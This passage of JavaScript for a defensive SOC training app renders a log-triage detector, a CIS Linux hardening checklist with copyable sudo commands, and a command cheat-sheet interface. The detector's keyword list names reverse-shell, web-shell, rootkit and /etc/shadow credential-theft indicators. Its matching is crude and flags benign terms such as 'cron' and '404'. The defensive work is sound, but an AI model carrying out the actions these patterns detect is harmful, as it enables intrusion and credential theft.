      <textarea id="log-input-area" class="log-textarea" style="width:100%; min-height:160px; font-family:'Fira Code',monospace; font-size:0.85rem; padding:0.9rem; border-radius:10px; border:1.5px solid var(--card-border); background:#0f172a; color:#f8fafc;" placeholder="Paste raw Linux log lines (/var/log/auth.log, syslog, apache access.log)..."></textarea>
      
      <div style="text-align:center; margin-top:0.8rem;">
        <button class="btn-action btn-cyber" onclick="runLogTriage()" style="padding:0.75rem 2rem; font-size:1.05rem; font-weight:800; background:var(--accent-blue); color:#ffffff; border:none; border-radius:10px; cursor:pointer;">
          🔍 Run Automated Threat Detection Engine
        </button>
      </div>

      <div id="log-triage-results" style="display:none; margin-top:1.5rem;"></div>
    </article>
  `;
}

function loadSampleLog(preset) {
  const area = document.getElementById("log-input-area");
  if (area && SAMPLE_LOGS[preset]) {
    area.value = SAMPLE_LOGS[preset];
    runLogTriage();
  }
}

function runLogTriage() {
  const raw = document.getElementById("log-input-area").value;
  const resultsDiv = document.getElementById("log-triage-results");
  if (!raw.trim()) { alert("Please paste log lines or select a sample preset first!"); return; }

  const lines = raw.split("\n");
  let threatCount = 0;
  let detectedThreats = [];

  const processedLines = lines.map(line => {
    let lower = line.toLowerCase();
    let isHigh = false;
    let isMed = false;

    if (lower.includes("failed password") || lower.includes("shell.php") || lower.includes("sudo:") || lower.includes("suid") || lower.includes("accepted password for root") || lower.includes("insmod") || lower.includes("/etc/shadow") || lower.includes("dev/tcp") || lower.includes("gpg") || lower.includes("cron")) {
      isHigh = true;
      threatCount++;
      if (lower.includes("failed password") && !detectedThreats.includes("SSH Brute Force Attempt (T1110)")) detectedThreats.push("SSH Brute Force Attempt (T1110)");
      if (lower.includes("shell.php") && !detectedThreats.includes("Web Shell Command Execution (T1505.003)")) detectedThreats.push("Web Shell Command Execution (T1505.003)");
      if (lower.includes("sudo:") && !detectedThreats.includes("Sudo PrivEsc Abuse (T1548.002)")) detectedThreats.push("Sudo PrivEsc Abuse (T1548.002)");
      if (lower.includes("suid") && !detectedThreats.includes("SUID Binary Abuse (T1548.001)")) detectedThreats.push("SUID Binary Abuse (T1548.001)");
      if (lower.includes("insmod") && !detectedThreats.includes("Kernel Rootkit Load (T1014)")) detectedThreats.push("Kernel Rootkit Load (T1014)");
      if (lower.includes("/etc/shadow") && !detectedThreats.includes("Shadow Credential Reading (T1003.008)")) detectedThreats.push("Shadow Credential Reading (T1003.008)");
      if (lower.includes("dev/tcp") && !detectedThreats.includes("Reverse Shell Beaconing (T1095)")) detectedThreats.push("Reverse Shell Beaconing (T1095)");
    } else if (lower.includes("invalid user") || lower.includes("connection established") || lower.includes("session") || lower.includes("403") || lower.includes("404")) {
      isMed = true;
      threatCount++;
    }

    const cssClass = isHigh ? 'log-line threat-high' : isMed ? 'log-line threat-medium' : 'log-line';
    const highlightStyle = isHigh ? 'background:rgba(239,68,68,0.2); color:#f87171; font-weight:800;' : isMed ? 'background:rgba(234,179,8,0.15); color:#facc15;' : '';
    return `<div class="${cssClass}" style="padding:0.3rem 0.6rem; margin:0.15rem 0; border-radius:4px; font-family:'Fira Code',monospace; font-size:0.84rem; ${highlightStyle}">${escapeHTML(line)}</div>`;
  }).join('');

  resultsDiv.style.display = "block";
  resultsDiv.innerHTML = `
    <div style="background:var(--paper-bg); border:2px solid var(--card-border); border-radius:12px; padding:1.2rem; margin-bottom:1rem;">
      <h3 style="color:${threatCount > 0 ? 'var(--accent-red)' : 'var(--accent-green)'}; font-size:1.2rem; margin-bottom:0.5rem; font-family:'Outfit',sans-serif;">
        ${threatCount > 0 ? `🚨 Threat Detection Result: ${threatCount} Anomalous Line(s) Detected!` : `✅ Log Stream Clean — No Immediate High Severity Threats`}
      </h3>
      ${detectedThreats.length > 0 ? `
        <div style="margin-bottom:0.8rem;">
          <strong style="color:var(--text-ink);">Mapped MITRE ATT&CK TTPs:</strong>
          <div style="display:flex; gap:0.4rem; margin-top:0.4rem; flex-wrap:wrap;">
            ${detectedThreats.map(t => `<span class="cover-badge" style="background:#fee2e2; color:#991b1b; border:1px solid #f87171; padding:0.25rem 0.65rem; border-radius:12px; font-weight:800; font-size:0.78rem;">${t}</span>`).join('')}
          </div>
        </div>
      ` : ''}
      <div style="font-family:var(--font-hand); font-size:1.05rem; color:var(--text-ink); background:var(--bg-app); padding:0.9rem; border-radius:10px; border:1px solid var(--card-border); margin-top:0.6rem;">
        💡 <strong>Telugu-English SOC Analyst Triage Note:</strong> Ee log stream lo red high-severity threat lines highlight chesam. Immediate SOC containment steps: 1) Block attacker source IP via UFW / IPTables, 2) Revoke compromised user sessions using \`pkill -u <user>\`, 3) Audit \`/var/log/auth.log\` & \`/etc/shadow\` for persistent backdoors!
      </div>
    </div>

    <div class="log-output-box" style="background:#0f172a; padding:1rem; border-radius:10px; overflow-x:auto;">
      ${processedLines}
    </div>
  `;
}

// --- 30-RULE CIS BENCHMARK LINUX HARDENING AUDIT CHECKLIST ---
const HARDENING_ITEMS = [
  // User & Access Security
  { id: "h1", cat: "User & Access Security", text: "Disable Root SSH Direct Login in /etc/ssh/sshd_config (PermitRootLogin no)", cmd: "sudo sed -i 's/#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config" },
  { id: "h2", cat: "User & Access Security", text: "Enforce SSH Protocol 2 and Disable Empty Passwords", cmd: "sudo sed -i 's/#PermitEmptyPasswords.*/PermitEmptyPasswords no/' /etc/ssh/sshd_config" },
  { id: "h3", cat: "User & Access Security", text: "Set Strict Permissions on /etc/shadow (chmod 600 & chown root:root)", cmd: "sudo chmod 600 /etc/shadow && sudo chown root:root /etc/shadow" },
  { id: "h4", cat: "User & Access Security", text: "Set Strict Permissions on /etc/passwd (chmod 644 & chown root:root)", cmd: "sudo chmod 644 /etc/passwd && sudo chown root:root /etc/passwd" },
  { id: "h5", cat: "User & Access Security", text: "Lock Dormant System Accounts (passwd -l <user>)", cmd: "sudo passwd -l www-data" },
  
  // Network & Firewall
  { id: "h6", cat: "Network & Firewall", text: "Enable UFW Firewall with Default Deny Incoming Rules", cmd: "sudo ufw default deny incoming && sudo ufw default allow outgoing && sudo ufw enable" },
  { id: "h7", cat: "Network & Firewall", text: "Disable IPv4 Routing / IP Forwarding in sysctl.conf", cmd: "sudo sysctl -w net.ipv4.ip_forward=0" },
  { id: "h8", cat: "Network & Firewall", text: "Disable ICMP Echo Broadcast Requests (Ignore Ping Sweep Scans)", cmd: "sudo sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=1" },
  { id: "h9", cat: "Network & Firewall", text: "Enable TCP SYN Cookies to Protect Against SYN Flood DoS Attacks", cmd: "sudo sysctl -w net.ipv4.tcp_syncookies=1" },
  { id: "h10", cat: "Network & Firewall", text: "Disable Source Routed Packet Acceptance (net.ipv4.conf.all.accept_source_route=0)", cmd: "sudo sysctl -w net.ipv4.conf.all.accept_source_route=0" },

  // File System Security
  { id: "h11", cat: "File System Security", text: "Audit All SUID/SGID Binaries for GTFOBins Privilege Escalation Vectors", cmd: "find / -type f \\( -perm -4000 -o -perm -2000 \\) -ls 2>/dev/null" },
  { id: "h12", cat: "File System Security", text: "Mount /tmp Directory with noexec, nosuid, nodev Flags in /etc/fstab", cmd: "sudo mount -o remount,noexec,nosuid,nodev /tmp" },
  { id: "h13", cat: "File System Security", text: "Mount /var/tmp with noexec Partition Restrictions", cmd: "sudo mount -o remount,noexec,nosuid,nodev /var/tmp" },
  { id: "h14", cat: "File System Security", text: "Audit World-Writable Directories and Remove Sticky Bits Fixes", cmd: "find / -type d \\( -perm -0002 -a ! -perm -1000 \\) -ls 2>/dev/null" },
  { id: "h15", cat: "File System Security", text: "Set Default Umask to 027 in /etc/profile & /etc/bash.bashrc", cmd: "echo 'umask 027' | sudo tee -a /etc/profile" },

  // Logging & Auditd
  { id: "h16", cat: "Logging & Auditd", text: "Enable Auditd Rules for Monitoring /etc/passwd and /etc/shadow Changes", cmd: "sudo auditctl -w /etc/shadow -p wa -k shadow_changes" },
  { id: "h17", cat: "Logging & Auditd", text: "Enable Auditd Monitoring for System Execution (execve syscalls)", cmd: "sudo auditctl -a always,exit -F arch=b64 -S execve -k system_exec" },
  { id: "h18", cat: "Logging & Auditd", text: "Configure Remote Syslog Forwarding to Central SIEM Collector", cmd: "echo '*.* @siem.company.internal:514' | sudo tee -a /etc/rsyslog.conf" },
  { id: "h19", cat: "Logging & Auditd", text: "Enforce Logrotate Compression for /var/log/ Auth & Syslog Logs", cmd: "sudo logrotate -f /etc/logrotate.conf" },
  { id: "h20", cat: "Logging & Auditd", text: "Restrict Permissions on /var/log File Artifacts (chmod 640)", cmd: "sudo chmod -R 640 /var/log/auth.log" },

  // Service Hardening
  { id: "h21", cat: "Service Hardening", text: "Disable Unnecessary Legacy Services (telnet, rsh, rlogin)", cmd: "sudo systemctl disable --now inetd rsh.socket rlogin.socket" },
  { id: "h22", cat: "Service Hardening", text: "Disable Unused Network Protocols (DCCP, SCTP, RDS, TIPC)", cmd: "echo 'install dccp /bin/true' | sudo tee /etc/modprobe.d/dccp.conf" },
  { id: "h23", cat: "Service Hardening", text: "Configure Fail2ban for Automatic SSH Brute Force IP Blocking", cmd: "sudo apt-get install fail2ban -y && sudo systemctl enable --now fail2ban" },
  { id: "h24", cat: "Service Hardening", text: "Disable Apache / Nginx Server Tokens & Banners Disclosure", cmd: "echo 'ServerTokens Prod' | sudo tee -a /etc/apache2/conf-available/security.conf" },
  { id: "h25", cat: "Service Hardening", text: "Restrict Cron Access to Authorized Users Only (/etc/cron.allow)", cmd: "echo 'root' | sudo tee /etc/cron.allow && sudo chmod 600 /etc/cron.allow" },

  // Kernel & Memory Security
  { id: "h26", cat: "Kernel & Memory Security", text: "Enable Address Space Layout Randomization (ASLR = 2)", cmd: "sudo sysctl -w kernel.randomize_va_space=2" },
  { id: "h27", cat: "Kernel & Memory Security", text: "Restrict dmesg Access to Root User Only (kernel.dmesg_restrict = 1)", cmd: "sudo sysctl -w kernel.dmesg_restrict=1" },
  { id: "h28", cat: "Kernel & Memory Security", text: "Restrict Kernel Pointer Addresses in /proc/kallsyms (kptr_restrict = 2)", cmd: "sudo sysctl -w kernel.kptr_restrict=2" },
  { id: "h29", cat: "Kernel & Memory Security", text: "Disable Unprivileged eBPF Execution (kernel.unprivileged_bpf_disabled = 1)", cmd: "sudo sysctl -w kernel.unprivileged_bpf_disabled=1" },
  { id: "h30", cat: "Kernel & Memory Security", text: "Enable Ptrace Scope Restrictions (kernel.yama.ptrace_scope = 1)", cmd: "sudo sysctl -w kernel.yama.ptrace_scope=1" }
];

function generateHardeningHTML() {
  const savedChecks = JSON.parse(localStorage.getItem("soc_hardening_checks") || "[]");
  const checkedCount = savedChecks.length;
  const pct = Math.round((checkedCount / HARDENING_ITEMS.length) * 100);

  return `
    <article class="hardening-wrapper">
      <div class="score-card" style="background:linear-gradient(135deg, #0284c7, #0369a1); color:#ffffff; padding:1.5rem; border-radius:16px; text-align:center; box-shadow:0 8px 24px rgba(2,132,199,0.3); margin-bottom:1.5rem;">
        <h2 style="font-size:1.6rem; margin-bottom:0.3rem; font-family:'Outfit',sans-serif;">🛡️ CIS Linux Benchmark Hardening Score</h2>
        <div style="font-size:2.8rem; font-weight:800; margin:0.4rem 0;"><span id="hardening-score-text">${pct}</span>%</div>
        <p style="font-size:0.92rem; opacity:0.95;">Completed <span id="hardening-count">${checkedCount}</span> of ${HARDENING_ITEMS.length} Enterprise Audit Control Rules</p>
        <div class="score-bar-bg" style="background:rgba(255,255,255,0.2); height:12px; border-radius:20px; overflow:hidden; margin-top:0.8rem;">
          <div id="hardening-score-fill" class="score-bar-fill" style="width:${pct}%; height:100%; background:#4ade80; border-radius:20px; transition:width 0.3s ease;"></div>
        </div>
      </div>

      <div class="checklist-group" style="display:flex; flex-direction:column; gap:0.9rem;">
        ${HARDENING_ITEMS.map(item => {
          const isChecked = savedChecks.includes(item.id);
          return `
            <div class="checklist-item" style="background:var(--paper-bg); border:1.5px solid var(--card-border); border-radius:12px; padding:1rem; display:flex; gap:1rem; align-items:flex-start; cursor:pointer;" onclick="toggleHardeningCheck('${item.id}')">
              <input type="checkbox" id="chk-${item.id}" ${isChecked ? 'checked' : ''} onclick="event.stopPropagation(); toggleHardeningCheck('${item.id}')" style="width:1.3rem; height:1.3rem; margin-top:0.2rem; cursor:pointer;" />
              <div style="flex:1;">
                <div style="font-size:0.75rem; font-weight:800; color:var(--accent-blue); text-transform:uppercase;">${item.cat}</div>
                <div style="font-weight:800; font-size:0.95rem; color:var(--text-ink); margin:0.2rem 0;">${item.text}</div>
                <div style="font-family:'Fira Code',monospace; font-size:0.8rem; color:#64748b; background:var(--bg-app); padding:0.4rem 0.8rem; border-radius:8px; border:1px solid var(--card-border); margin-top:0.4rem; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:0.4rem;">
                  <code style="color:var(--accent-red); font-weight:700;">${escapeHTML(item.cmd)}</code>
                  <button class="btn-copy-cmd" style="background:var(--accent-blue); color:#ffffff; border:none; padding:0.2rem 0.6rem; border-radius:6px; font-weight:700; cursor:pointer; font-size:0.75rem;" onclick="event.stopPropagation(); copyCmdToClipboardRaw('${escapeHTML(item.cmd)}', this)">📋 Copy Command</button>
                </div>
              </div>
            </div>
          `;
        }).join('')}
      </div>
    </article>
  `;
}

function toggleHardeningCheck(id) {
  let saved = JSON.parse(localStorage.getItem("soc_hardening_checks") || "[]");
  const idx = saved.indexOf(id);
  if (idx > -1) saved.splice(idx, 1);
  else saved.push(id);
  localStorage.setItem("soc_hardening_checks", JSON.stringify(saved));

  const pct = Math.round((saved.length / HARDENING_ITEMS.length) * 100);
  const scoreText = document.getElementById("hardening-score-text");
  const countText = document.getElementById("hardening-count");
  const scoreFill = document.getElementById("hardening-score-fill");
  const chkBox = document.getElementById(`chk-${id}`);

  if (chkBox) chkBox.checked = saved.includes(id);
  if (scoreText) scoreText.innerText = pct;
  if (countText) countText.innerText = saved.length;
  if (scoreFill) scoreFill.style.width = `${pct}%`;
}


// --- 3. MASTER CHEAT SHEET LOGIC ---
let activeCheatFilter = "All";
let activeCheatSubTab = "commands";
let bookmarkedCheatSheetIds = JSON.parse(localStorage.getItem("soc_bookmarked_cheatsheets") || "[]");

function generateCheatSheetHTML() {
  const dataset = window.MASTER_CHEATSHEET_DATA || { categories: [], recipes: [], scenarios: [], chains: [], top25: [], commands: [] };
  const commands = dataset.commands || [];
  const recipes = dataset.recipes || [];
  const scenarios = dataset.scenarios || [];
  const chains = dataset.chains || [];
  const top25 = dataset.top25 || [];

  const totalCmds = commands.length;
  const essentialCount = commands.filter(c => c.relevance === "Essential").length;
  const catCount = dataset.categories ? dataset.categories.length : 25;
  const bookmarkedCount = bookmarkedCheatSheetIds.length;

  const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".split("");

  return `
    <article class="hardening-wrapper cs-master-container">
      <!-- HEADER BANNER -->
      <div style="text-align:center; margin-bottom:0.6rem;">
        <h2 style="color:var(--accent-blue); font-size:1.75rem; margin-bottom:0.3rem; font-family:'Outfit',sans-serif; font-weight:800;">
          🚀 Linux SOC Analyst A–Z Master Command Field Handbook
        </h2>
        <p style="color:var(--text-dark); font-size:0.9rem; max-width:820px; margin:0 auto;">
          Blue Team Field Notebook: Detection → Triage → Investigation → Evidence Collection → Threat Hunting → Containment.
        </p>
      </div>

      <!-- STATS DASHBOARD -->
      <div class="cs-stats-row">
        <div class="cs-stat-card">
          <span class="cs-stat-icon">💻</span>
          <div>
            <div class="cs-stat-val" id="cs-stat-total">${totalCmds}</div>
            <div class="cs-stat-lbl">Master Commands</div>
          </div>
        </div>
        <div class="cs-stat-card">
          <span class="cs-stat-icon">⭐</span>
          <div>
            <div class="cs-stat-val">${essentialCount}</div>
            <div class="cs-stat-lbl">SOC Essentials</div>
          </div>
        </div>
        <div class="cs-stat-card">
          <span class="cs-stat-icon">📚</span>
          <div>
            <div class="cs-stat-val">${catCount}</div>
            <div class="cs-stat-lbl">SOC Categories</div>
          </div>
        </div>
        <div class="cs-stat-card">
          <span class="cs-stat-icon">🔖</span>
          <div>
            <div class="cs-stat-val" id="cs-stat-saved">${bookmarkedCount}</div>
            <div class="cs-stat-lbl">Bookmarked</div>
          </div>
        </div>
        <div class="cs-stat-card">
          <span class="cs-stat-icon">🧪</span>
          <div>
            <div class="cs-stat-val">${recipes.length}</div>
            <div class="cs-stat-lbl">Triage Recipes</div>
          </div>
        </div>
      </div>

      <!-- NAVIGATION SUB-TAB SWITCHER -->
      <div class="cs-tab-switcher">
        <button class="cs-tab-btn ${activeCheatSubTab === 'commands' ? 'active' : ''}" onclick="switchCheatSubTab('commands', this)">📚 All Commands &amp; Library</button>
        <button class="cs-tab-btn ${activeCheatSubTab === 'top25' ? 'active' : ''}" onclick="switchCheatSubTab('top25', this)">🚨 Top 25 Essentials</button>
        <button class="cs-tab-btn ${activeCheatSubTab === 'recipes' ? 'active' : ''}" onclick="switchCheatSubTab('recipes', this)">🧪 Triage Recipes (${recipes.length})</button>
        <button class="cs-tab-btn ${activeCheatSubTab === 'scenarios' ? 'active' : ''}" onclick="switchCheatSubTab('scenarios', this)">🎯 Real SOC Scenarios (${scenarios.length})</button>
        <button class="cs-tab-btn ${activeCheatSubTab === 'chains' ? 'active' : ''}" onclick="switchCheatSubTab('chains', this)">🔗 Evidence Chains (${chains.length})</button>
      </div>

      <!-- SECTION 1: ALL COMMANDS LIBRARY (DEFAULT) -->
      <div id="cs-sec-commands" class="cs-sub-section ${activeCheatSubTab === 'commands' ? 'active' : ''}">
        <!-- A-Z INDEX BAR -->
        <div class="cs-section-box" style="padding:1rem; margin-bottom:1rem;">
          <div class="cs-section-title" style="justify-content:center; margin-bottom:0.6rem; font-size:0.95rem;">🔤 Jump to Command by Initial Letter</div>
          <div class="cs-az-bar">
            ${alphabet.map(letter => `
              <button class="cs-az-btn" onclick="filterCheatByLetter('${letter}')">${letter}</button>
            `).join('')}
          </div>
        </div>

        <!-- SEARCH & FILTER CONTROLS -->
        <div class="cs-controls-bar" style="margin-bottom:1.2rem;">
          <input type="text" id="cs-search-input" class="cs-search-input" value="${escapeHTML(activeCheatSearch)}" placeholder="🔍 Search commands, flags, keywords, SOC use cases (e.g. ps, SSH, brute force, persistence, SUID)..." oninput="handleCheatSearch(this.value)" />

          <div class="cs-filter-pills" id="cs-filter-pills">
            <button class="cs-pill ${activeCheatFilter === 'All' ? 'active' : ''}" onclick="setCheatFilter('All', this)">All Commands (${totalCmds})</button>
            <button class="cs-pill ${activeCheatFilter === 'Saved' ? 'active' : ''}" onclick="setCheatFilter('Saved', this)">⭐ Saved (${bookmarkedCheatSheetIds.length})</button>
            ${dataset.categories.map(cat => `
              <button class="cs-pill ${activeCheatFilter === cat ? 'active' : ''}" onclick="setCheatFilter('${cat}', this)">${cat}</button>
            `).join('')}
          </div>
        </div>

        <!-- CARDS GRID -->
        <div class="cs-cards-grid" id="cs-cards-grid">
          ${renderCheatCards(getFilteredCommands(commands))}
        </div>
      </div>

      <!-- SECTION 2: TOP 25 ESSENTIALS -->
      <div id="cs-sec-top25" class="cs-sub-section ${activeCheatSubTab === 'top25' ? 'active' : ''}">
        <div class="cs-section-box">
          <div class="cs-section-title">🚨 Top 25 Commands Every Linux SOC Analyst Must Master</div>
          <p style="font-size:0.85rem; color:#64748b; margin-bottom:1rem;">Click any command tag to instantly jump to its detailed field investigation card!</p>
          <div class="cs-top25-grid">
            ${top25.map(id => {
              const cmd = commands.find(c => c.id === id);
              if (!cmd) return '';
              return `<button class="cs-top25-btn" onclick="jumpToCommandCard('${cmd.id}')">${escapeHTML(cmd.cmd.split(' ')[0])} <span style="font-size:0.7rem; opacity:0.8;">(${cmd.cmd})</span></button>`;
            }).join('')}
          </div>
        </div>
      </div>

      <!-- SECTION 3: TRIAGE RECIPES -->
      <div id="cs-sec-recipes" class="cs-sub-section ${activeCheatSubTab === 'recipes' ? 'active' : ''}">
        <div class="cs-section-box">
          <div class="cs-section-title">🧪 SOC Quick Triage &amp; Investigation Recipes</div>
          <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(360px, 1fr)); gap:1.2rem; margin-top:1rem;">
            ${recipes.map(r => `
              <div style="background:var(--bg-app); border:1.5px solid var(--card-border); border-radius:12px; padding:1.2rem;">
                <h4 style="color:var(--accent-blue); font-size:1.05rem; margin-bottom:0.4rem;">${r.title}</h4>
                <p style="font-size:0.84rem; color:#64748b; margin-bottom:0.8rem;">${r.desc}</p>
                <div style="display:flex; flex-direction:column; gap:0.5rem;">
                  ${r.steps.map(s => `
                    <div style="font-size:0.8rem; font-family:var(--font-mono); background:var(--paper-bg); padding:0.45rem 0.75rem; border-radius:8px; border:1px solid var(--card-border); display:flex; justify-content:space-between; align-items:center;">
                      <div>
                        <span style="font-size:0.72rem; font-weight:800; color:var(--accent-blue); display:block; font-family:sans-serif;">${escapeHTML(s.step)}</span>
                        <span style="color:var(--accent-red); font-weight:700;">${escapeHTML(s.cmd)}</span>
                      </div>
                      <button class="cs-btn-copy" style="position:static; padding:0.25rem 0.6rem;" onclick="copyCmdToClipboardRaw('${escapeHTML(s.cmd)}', this)">📋 Copy</button>
                    </div>
                  `).join('')}
                </div>
              </div>
            `).join('')}
          </div>
        </div>
      </div>

      <!-- SECTION 4: REAL SOC SCENARIOS -->
      <div id="cs-sec-scenarios" class="cs-sub-section ${activeCheatSubTab === 'scenarios' ? 'active' : ''}">
        <div class="cs-section-box">
          <div class="cs-section-title">🎯 Real SOC Scenarios ("What Would You Investigate?")</div>
          <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(360px, 1fr)); gap:1.2rem; margin-top:1rem;">
            ${scenarios.map(sc => `
              <div style="background:var(--bg-app); border:1.5px solid var(--card-border); border-radius:12px; padding:1.2rem;">
                <h4 style="color:var(--accent-red); font-size:1.05rem; margin-bottom:0.4rem;">${sc.title}</h4>
                <p style="font-size:0.85rem; color:var(--text-dark); margin-bottom:0.8rem;">${sc.desc}</p>
                <div style="font-size:0.82rem; display:flex; flex-direction:column; gap:0.45rem;">
                  ${sc.steps.map(st => `
                    <div style="background:var(--paper-bg); border-left:4px solid var(--accent-blue); padding:0.5rem 0.8rem; border-radius:0 8px 8px 0; color:var(--text-ink); font-weight:500;">
                      ${escapeHTML(st)}
                    </div>
                  `).join('')}
                </div>
              </div>
            `).join('')}
          </div>
        </div>
      </div>

      <!-- SECTION 5: EVIDENCE CHAINS -->
      <div id="cs-sec-chains" class="cs-sub-section ${activeCheatSubTab === 'chains' ? 'active' : ''}">
        <div class="cs-section-box">
          <div class="cs-section-title">🔗 SOC Command Chains (Alert to Evidence Correlation)</div>
          <div style="display:flex; flex-direction:column; gap:1.2rem; margin-top:1rem;">
            ${chains.map(ch => `
              <div style="background:var(--bg-app); border:1.5px solid var(--card-border); border-radius:12px; padding:1.2rem;">
                <h4 style="color:var(--accent-blue); font-size:1.05rem; margin-bottom:0.8rem;">${ch.title}</h4>
                <div style="display:flex; flex-wrap:wrap; gap:0.6rem; align-items:center;">
                  ${ch.chain.map((step, idx) => `
                    <div style="background:var(--paper-bg); border:1px solid var(--card-border); padding:0.5rem 0.9rem; border-radius:8px; font-size:0.82rem; flex:1; min-width:200px;">
                      <span style="font-size:0.7rem; font-weight:800; color:var(--accent-blue); display:block; text-transform:uppercase;">${step.stage}</span>
                      <span style="font-weight:700; font-family:var(--font-mono); color:var(--accent-red);">${escapeHTML(step.text)}</span>
                      ${step.note ? `<span style="font-size:0.75rem; color:#64748b; display:block; margin-top:0.2rem;">${escapeHTML(step.note)}</span>` : ''}
                    </div>
                    ${idx < ch.chain.length - 1 ? `<span style="color:var(--accent-blue); font-weight:800; font-size:1.2rem;">➔</span>` : ''}
                  `).join('')}
                </div>
              </div>
            `).join('')}
          </div>
        </div>
      </div>
    </article>
  `;
}

function switchCheatSubTab(tabName, btnEl) {
  activeCheatSubTab = tabName;
  const btns = document.querySelectorAll(".cs-tab-switcher .cs-tab-btn");
  btns.forEach(b => b.classList.remove("active"));
  if (btnEl) btnEl.classList.add("active");

  const sections = document.querySelectorAll(".cs-sub-section");
  sections.forEach(s => s.classList.remove("active"));

  const targetSec = document.getElementById(`cs-sec-${tabName}`);
  if (targetSec) targetSec.classList.add("active");
}

function jumpToCommandCard(id) {
  switchCheatSubTab("commands");
  const pills = document.querySelectorAll("#cs-filter-pills .cs-pill");
  if (pills.length > 0) {
    pills[0].click();
  }
  setTimeout(() => {
    scrollToCheatCard(id);
  }, 150);
}

function getFilteredCommands(allCommands) {
  let commands = allCommands || [];
  if (activeCheatFilter === "Saved") {
    commands = commands.filter(c => bookmarkedCheatSheetIds.includes(c.id));
  } else if (activeCheatFilter !== "All") {
    commands = commands.filter(c => c.cat === activeCheatFilter);
  }

  if (activeCheatSearch) {
    commands = commands.filter(c =>
      c.cmd.toLowerCase().includes(activeCheatSearch) ||
      c.cat.toLowerCase().includes(activeCheatSearch) ||
      c.desc.toLowerCase().includes(activeCheatSearch) ||
      c.socUse.toLowerCase().includes(activeCheatSearch) ||
      c.lookFor.toLowerCase().includes(activeCheatSearch) ||
      (c.tags && c.tags.some(t => t.toLowerCase().includes(activeCheatSearch)))
    );
  }
  return commands;
}

function renderCheatCards(commands) {
  if (!commands || commands.length === 0) {
    return `<div style="grid-column:1/-1; text-align:center; padding:3rem; color:#64748b; font-size:1rem;">No matching commands found. Try adjusting your search query or filter.</div>`;
  }

  return commands.map(c => {
    const isStarred = bookmarkedCheatSheetIds.includes(c.id);
    const diffClass = c.difficulty === "Beginner" ? "cs-badge-beg" : c.difficulty === "Intermediate" ? "cs-badge-int" : "cs-badge-adv";

    return `
      <div class="cs-card" id="card-${c.id}">
        <div>
          <div class="cs-card-header">
            <span class="cs-card-cat">${escapeHTML(c.cat)}</span>
            <div class="cs-card-badges">
              <span class="cs-badge ${diffClass}">${c.difficulty}</span>
              ${c.relevance === "Essential" ? `<span class="cs-badge" style="background:rgba(56,189,248,0.15); color:var(--accent-blue); border:1px solid var(--accent-blue);">⭐ Essential</span>` : ''}
              ${c.systemChanging ? `<span class="cs-badge cs-badge-changing">⚠️ SYSTEM-CHANGING</span>` : ''}
            </div>
          </div>

          <div class="cs-cmd-box">
            <button class="cs-btn-copy" onclick="copyCmdToClipboardRaw('${escapeHTML(c.cmd)}', this)">📋 Copy</button>
            <div class="cs-cmd-code">${escapeHTML(c.cmd)}</div>
          </div>

          <div class="cs-card-detail"><strong>Purpose:</strong> ${escapeHTML(c.desc)}</div>
          <div class="cs-card-detail"><strong>🎯 SOC Use:</strong> ${escapeHTML(c.socUse)}</div>
          <div class="cs-card-detail"><strong>🔎 Look For:</strong> ${escapeHTML(c.lookFor)}</div>
          ${c.analystTip ? `<div class="cs-card-detail" style="color:var(--accent-blue);"><strong>💡 Analyst Tip:</strong> ${escapeHTML(c.analystTip)}</div>` : ''}
          ${c.example ? `<div class="cs-card-detail" style="font-family:var(--font-mono); font-size:0.78rem; background:var(--bg-app); padding:0.4rem 0.6rem; border-radius:6px; border:1px solid var(--card-border);"><strong>Example:</strong> ${escapeHTML(c.example)}</div>` : ''}
        </div>

        <div class="cs-card-footer">
          <span style="font-size:0.75rem; color:#64748b; font-weight:600;">Scenario: ${escapeHTML(c.scenario || 'General Triage')}</span>
          <button class="cs-btn-star ${isStarred ? 'starred' : ''}" onclick="toggleCheatBookmark('${c.id}', this)" title="Bookmark command">⭐</button>
        </div>
      </div>
    `;
  }).join('');
}

function handleCheatSearch(query) {
  activeCheatSearch = query.toLowerCase().trim();
  filterAndRenderCheatCards();
}

function setCheatFilter(filterName, btnEl) {
  activeCheatFilter = filterName;
  const pills = document.querySelectorAll("#cs-filter-pills .cs-pill");
  pills.forEach(p => p.classList.remove("active"));
  if (btnEl) btnEl.classList.add("active");
  filterAndRenderCheatCards();
}

function filterCheatByLetter(letter) {
  const searchInput = document.getElementById("cs-search-input");
  if (searchInput) {
    searchInput.value = letter;
    handleCheatSearch(letter);
  }
}

function filterAndRenderCheatCards() {
  const dataset = window.MASTER_CHEATSHEET_DATA || { commands: [] };
  const commands = getFilteredCommands(dataset.commands);

  const grid = document.getElementById("cs-cards-grid");
  if (grid) {
    grid.innerHTML = renderCheatCards(commands);
  }
}


function copyCmdToClipboardRaw(text, btnEl) {
  navigator.clipboard.writeText(text).then(() => {
    if (btnEl) {
      const origText = btnEl.innerText;
      btnEl.innerText = "✓ Copied";
      btnEl.classList.add("copied");
      setTimeout(() => {
        btnEl.innerText = origText;
        btnEl.classList.remove("copied");
      }, 1500);
    }
  }).catch(() => {
    alert(`Command: ${text}`);
  });
}

function toggleCheatBookmark(id, btnEl) {
  const idx = bookmarkedCheatSheetIds.indexOf(id);
  if (idx > -1) {
    bookmarkedCheatSheetIds.splice(idx, 1);
    if (btnEl) btnEl.classList.remove("starred");
  } else {
    bookmarkedCheatSheetIds.push(id);
    if (btnEl) btnEl.classList.add("starred");
  }
  localStorage.setItem("soc_bookmarked_cheatsheets", JSON.stringify(bookmarkedCheatSheetIds));

  const savedStat = document.getElementById("cs-stat-saved");
  if (savedStat) savedStat.innerText = bookmarkedCheatSheetIds.length;
}

function scrollToCheatCard(id) {
  const card = document.getElementById(`card-${id}`);
  if (card) {
    card.scrollIntoView({ behavior: 'smooth', block: 'center' });
    card.style.borderColor = 'var(--accent-blue)';
    card.style.boxShadow = '0 0 20px rgba(56, 189, 248, 0.4)';
    setTimeout(() => {
      card.style.borderColor = '';
      card.style.boxShadow = '';
    }, 2000);
  } else {
    activeCheatFilter = "All";
    activeCheatSearch = "";
    filterAndRenderCheatCards();
    setTimeout(() => {
      scrollToCheatCard(id);
    }, 100);
  }
}



